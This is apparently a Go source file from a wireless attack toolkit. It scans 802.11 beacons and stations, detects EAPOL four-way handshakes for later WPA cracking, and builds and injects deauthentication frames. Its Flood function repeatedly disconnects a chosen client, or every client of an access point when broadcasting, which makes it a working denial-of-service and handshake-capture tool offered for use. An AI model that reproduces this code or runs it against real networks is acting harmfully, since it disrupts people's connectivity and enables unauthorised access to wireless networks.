// Package wlan implements the 802.11 primitives used by the wireless attack
// modules: passive beacon scanning, EAPOL handshake detection and
// deauthentication-frame injection. All operations require a monitor-mode
// interface opened in radio tap capture mode.
package wlan

import (
	"errors"
	"fmt"
	"net"
	"sync"
	"sync/atomic"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// AP is a single access point observed from its beacon frames.
type AP struct {
	BSSID     net.HardwareAddr
	SSID      string
	Channel   uint8
	RSSI      int8
	Security  string // "open", "wep", "wpa", "wpa2"
	FirstSeen time.Time
	LastSeen  time.Time
}

// Client is a station observed on the air (probe requests or data frames).
type Client struct {
	MAC      net.HardwareAddr
	AP       net.HardwareAddr // BSSID it is associated to, if any
	LastSeen time.Time
}

// Handshake tracks an observed 802.11 authentication exchange.
type Handshake struct {
	AP       net.HardwareAddr
	Client   net.HardwareAddr
	Messages int // 1..4 EAPOL key frames observed
	Complete bool
	Started  time.Time
}

// Scanner passively inspects a monitor interface for beacons and clients.
type Scanner struct {
	iface   string
	handle  *pcap.Handle
	stopped chan struct{}

	mu      sync.Mutex // guards the three observation maps
	aps     map[string]*AP
	clients map[string]*Client
	hs      map[string]*Handshake

	Beacons atomic.Uint64
	EAPOL   atomic.Uint64
	Deauth  atomic.Uint64
}

// NewScanner opens a monitor interface in promiscuous radio-tap mode.
func NewScanner(iface string) (*Scanner, error) {
	handle, err := pcap.OpenLive(iface, 65535, true, 500*time.Millisecond)
	if err != nil {
		return nil, fmt.Errorf("wlan: open %s: %w", iface, err)
	}
	return &Scanner{
		iface:   iface,
		handle:  handle,
		stopped: make(chan struct{}),
		aps:     map[string]*AP{},
		clients: map[string]*Client{},
		hs:      map[string]*Handshake{},
	}, nil
}

// Start begins the capture goroutine.
func (s *Scanner) Start() {
	go s.readLoop()
}

// readLoop pulls frames until stopped, tolerating transient pcap errors.
func (s *Scanner) readLoop() {
	for {
		select {
		case <-s.stopped:
			return
		default:
		}
		data, ci, err := s.handle.ReadPacketData()
		if err != nil {
			select {
			case <-s.stopped:
				return
			default:
			}
			continue
		}
		s.process(data, ci)
	}
}

// process classifies one captured radio-tap frame and updates the counters
// and observation tables.
func (s *Scanner) process(data []byte, ci gopacket.CaptureInfo) {
	packet := gopacket.NewPacket(data, layers.LayerTypeRadioTap, gopacket.NoCopy)
	dot11Layer := packet.Layer(layers.LayerTypeDot11)
	if dot11Layer == nil {
		return
	}
	dot11, ok := dot11Layer.(*layers.Dot11)
	if !ok {
		return
	}

	// Pull the antenna signal strength from the radiotap header if present.
	rssi := int8(0)
	if radio := packet.Layer(layers.LayerTypeRadioTap); radio != nil {
		if rt, ok := radio.(*layers.RadioTap); ok {
			rssi = int8(rt.DBMAntennaSignal)
		}
	}

	switch {
	case dot11.Type == layers.Dot11TypeMgmtBeacon:
		s.Beacons.Add(1)
		s.recordBeacon(packet, rssi, ci.Timestamp)
	case dot11.Type == layers.Dot11TypeMgmtProbeReq:
		s.recordProbe(dot11, rssi, ci.Timestamp)
	case dot11.Type.MainType() == layers.Dot11TypeData:
		s.recordData(dot11, rssi, ci.Timestamp)
	case dot11.Type == layers.Dot11TypeMgmtDeauthentication,
		dot11.Type == layers.Dot11TypeMgmtDisassociation:
		// Deauth/disassoc frames indicate active (or forced) disconnection.
		s.Deauth.Add(1)
	}
}

// recordBeacon upserts an access point from a beacon frame, keyed by BSSID
// (the transmitter address).
func (s *Scanner) recordBeacon(packet gopacket.Packet, rssi int8, ts time.Time) {
	b, ok := packet.Layer(layers.LayerTypeDot11MgmtBeacon).(*layers.Dot11MgmtBeacon)
	if !ok {
		return
	}
	dot11 := packet.Layer(layers.LayerTypeDot11).(*layers.Dot11)
	ssid, channel, security := parseBeacon(b)

	s.mu.Lock()
	key := string(dot11.Address2)
	ap, found := s.aps[key]
	if !found {
		ap = &AP{}
		s.aps[key] = ap
	}
	ap.BSSID = append(net.HardwareAddr(nil), dot11.Address2...)
	// Keep the first-seen SSID; hidden beacons may later show a real name.
	if ap.SSID == "" {
		ap.SSID = ssid
	}
	ap.Channel = channel
	ap.Security = security
	ap.RSSI = rssi
	ap.LastSeen = ts
	if !found {
		ap.FirstSeen = ts
	}
	s.mu.Unlock()
}

// recordProbe records a station that sent a probe request. Probe requests
// carry the station's MAC in Address2 regardless of the request's content.
func (s *Scanner) recordProbe(dot11 *layers.Dot11, _ int8, ts time.Time) {
	s.mu.Lock()
	c, found := s.clients[string(dot11.Address2)]
	if !found {
		c = &Client{}
		s.clients[string(dot11.Address2)] = c
	}
	c.MAC = append(net.HardwareAddr(nil), dot11.Address2...)
	c.LastSeen = ts
	s.mu.Unlock()
}

// recordData links a station to the BSSID it is exchanging data with. ToDS
// frames come from the station (Address2); FromDS frames go to it.
func (s *Scanner) recordData(dot11 *layers.Dot11, _ int8, ts time.Time) {
	var sta, bssid net.HardwareAddr
	if dot11.Flags.ToDS() {
		bssid, sta = dot11.Address1, dot11.Address2
	} else {
		bssid, sta = dot11.Address2, dot11.Address1
	}
	s.mu.Lock()
	if c, found := s.clients[string(sta)]; found {
		c.AP = append(net.HardwareAddr(nil), bssid...)
		c.LastSeen = ts
	} else {
		s.clients[string(sta)] = &Client{MAC: sta, AP: bssid, LastSeen: ts}
	}
	s.mu.Unlock()
}

// privacyCapability is the capability-info bit that signals a WEP-enabled AP.
const privacyCapability uint16 = 0x0010

// parseBeacon extracts the SSID, channel and security mode from a beacon body.
// The tags live in the beacon payload after the 12-byte fixed header; each is
// <id> <length> <value>.
func parseBeacon(b *layers.Dot11MgmtBeacon) (ssid string, channel uint8, security string) {
	security = "open"
	contents := b.Payload
	i := 0
	for i+2 <= len(contents) {
		tag := contents[i]
		length := int(contents[i+1])
		// Malformed trailing tag: stop walking rather than reading past the
		// end of the payload.
		if i+2+length > len(contents) {
			break
		}
		value := contents[i+2 : i+2+length]
		switch tag {
		case 0: // SSID
			ssid = string(value)
		case 3: // DS parameter set -> channel
			if length >= 1 {
				channel = value[0]
			}
		case 48: // RSN -> WPA2
			security = "wpa2"
		case 221: // vendor specific; check for WPA OUI
			// WPA (TKIP-era) is signalled by a vendor element with the
			// Microsoft OUI; only promote to "wpa" if nothing stronger
			// was already declared.
			if isWPAOUI(value) && security == "open" {
				security = "wpa"
			}
		}
		i += 2 + length
	}
	// The privacy bit in the capability field marks WEP when no RSN/WPA
	// element is present.
	if security == "open" && b.Flags&privacyCapability != 0 {
		security = "wep"
	}
	return
}

// isWPAOUI reports whether a vendor-specific element carries the Microsoft
// OUI 00:50:f2:01 identifying a WPA information element.
func isWPAOUI(v []byte) bool {
	return len(v) >= 4 && v[0] == 0x00 && v[1] == 0x50 && v[2] == 0xf2 && v[3] == 0x01
}

// CountEAPOL inspects a data frame for EAPOL key messages and updates the
// handshake table. It returns the BSSID/station pair and whether the observed
// exchange is complete.
func (s *Scanner) CountEAPOL(data []byte, _ gopacket.CaptureInfo) (bssid, sta net.HardwareAddr, complete bool) {
	packet := gopacket.NewPacket(data, layers.LayerTypeRadioTap, gopacket.NoCopy)
	dot11Layer := packet.Layer(layers.LayerTypeDot11)
	if dot11Layer == nil {
		return nil, nil, false
	}
	dot11, _ := dot11Layer.(*layers.Dot11)
	// EAPOL rides inside 802.11 data frames only.
	if dot11 == nil || dot11.Type.MainType() != layers.Dot11TypeData {
		return nil, nil, false
	}
	// The 802.11 payload must be LLC-framed.
	llcLayer := packet.Layer(layers.LayerTypeLLC)
	if llcLayer == nil {
		return nil, nil, false
	}
	if _, ok := llcLayer.(*layers.LLC); !ok {
		return nil, nil, false
	}
	// The SNAP header's ethertype must be 0x888e (EAPOL). Some drivers omit
	// SNAP entirely, so a missing SNAP layer is tolerated.
	if snapLayer := packet.Layer(layers.LayerTypeSNAP); snapLayer != nil {
		snap, ok := snapLayer.(*layers.SNAP)
		if !ok || snap.Type != 0x888e {
			return nil, nil, false
		}
	}
	s.EAPOL.Add(1)

	if dot11.Flags.ToDS() {
		bssid, sta = dot11.Address1, dot11.Address2
	} else {
		bssid, sta = dot11.Address2, dot11.Address1
	}

	key := string(sta) + string(bssid)
	s.mu.Lock()
	h, found := s.hs[key]
	if !found {
		h = &Handshake{AP: bssid, Client: sta, Started: time.Now()}
		s.hs[key] = h
	}
	h.Messages++
	// The 4-way handshake is complete once all four key messages (or enough
	// to reconstruct the PMK) have been observed.
	if h.Messages >= 4 {
		h.Complete = true
	}
	complete = h.Complete
	s.mu.Unlock()
	return bssid, sta, complete
}

// APs returns a snapshot of all observed access points.
func (s *Scanner) APs() []AP {
	s.mu.Lock()
	defer s.mu.Unlock()
	out := make([]AP, 0, len(s.aps))
	for _, a := range s.aps {
		out = append(out, *a)
	}
	return out
}

// Clients returns a snapshot of all observed stations.
func (s *Scanner) Clients() []Client {
	s.mu.Lock()
	defer s.mu.Unlock()
	out := make([]Client, 0, len(s.clients))
	for _, c := range s.clients {
		out = append(out, *c)
	}
	return out
}

// Handshakes returns a snapshot of the handshake table.
func (s *Scanner) Handshakes() []Handshake {
	s.mu.Lock()
	defer s.mu.Unlock()
	out := make([]Handshake, 0, len(s.hs))
	for _, h := range s.hs {
		out = append(out, *h)
	}
	return out
}

// Close stops the capture loop and releases the interface.
func (s *Scanner) Close() {
	select {
	case <-s.stopped:
	default:
		close(s.stopped)
	}
	s.handle.Close()
}

// BuildDeauth constructs a raw radio-tap 802.11 deauthentication frame that
// can be injected on a monitor interface.
func BuildDeauth(ap, sta net.HardwareAddr, reason layers.Dot11Reason) ([]byte, error) {
	if len(ap) != 6 {
		return nil, errors.New("wlan: ap MAC must be 6 bytes")
	}
	radioTap := &layers.RadioTap{}
	dot11 := &layers.Dot11{
		Type: layers.Dot11TypeMgmtDeauthentication,

		// Address1 = destination (the station being kicked), Address2/3 =
		// source/BSSID (the access point).
		Address1: sta,
		Address2: ap,
		Address3: ap,
	}
	deauth := &layers.Dot11MgmtDeauthentication{Reason: reason}
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true}
	if err := gopacket.SerializeLayers(buf, opts, radioTap, dot11, deauth); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

// DeauthSender floods deauthentication frames. It opens its own injection
// handle on the monitor interface.
type DeauthSender struct {
	handle *pcap.Handle
}

// NewDeauthSender opens an injection-capable handle.
func NewDeauthSender(iface string) (*DeauthSender, error) {
	handle, err := pcap.OpenLive(iface, 65535, true, 100*time.Millisecond)
	if err != nil {
		return nil, fmt.Errorf("wlan: open inject %s: %w", iface, err)
	}
	return &DeauthSender{handle: handle}, nil
}

// Flood sends count deauth frames from ap to sta (broadcast when sta is nil).
func (d *DeauthSender) Flood(ap, sta net.HardwareAddr, count int, reason layers.Dot11Reason) (int, error) {
	dst := sta
	if len(dst) == 0 {
		// Broadcast deauth: kick every station off the AP at once.
		dst = net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
	}
	frame, err := BuildDeauth(ap, dst, reason)
	if err != nil {
		return 0, err
	}
	sent := 0
	for i := 0; i < count; i++ {
		if err := d.handle.WritePacketData(frame); err != nil {
			return sent, err
		}
		sent++
		// Brief gap between frames: some drivers drop frames sent back to
		// back, and clients need the airtime to receive each one.
		time.Sleep(2 * time.Millisecond)
	}
	return sent, nil
}

// Close releases the injection handle.
func (d *DeauthSender) Close() { d.handle.Close() }
